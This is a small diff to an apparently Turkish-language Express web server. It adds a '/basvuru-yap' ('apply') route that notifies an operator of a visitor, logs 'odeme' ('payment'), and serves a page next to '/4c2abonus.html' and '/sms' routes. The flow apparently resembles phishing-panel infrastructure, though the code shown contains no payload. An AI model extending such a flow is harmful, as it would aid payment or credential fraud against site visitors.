@@ -59,6 +59,18 @@ app.get('/4c2abonus.html', (req, res) => {
      });
  });
  
+ app.get('/basvuru-yap', (req, res) => {
+    notifyVisitorLogin()
+     .then(() => {
+        console.log('odeme');
+       res.sendFile(path.join(__dirname, 'public', 'basvuru-yap.html'));
+     })
+     .catch((error) => {
+       console.error('Error:', error);
+       res.status(500).send('Internal Server Error');
+     });
+ });
+ 
 
 
   app.get('/sms', (req, res) => {
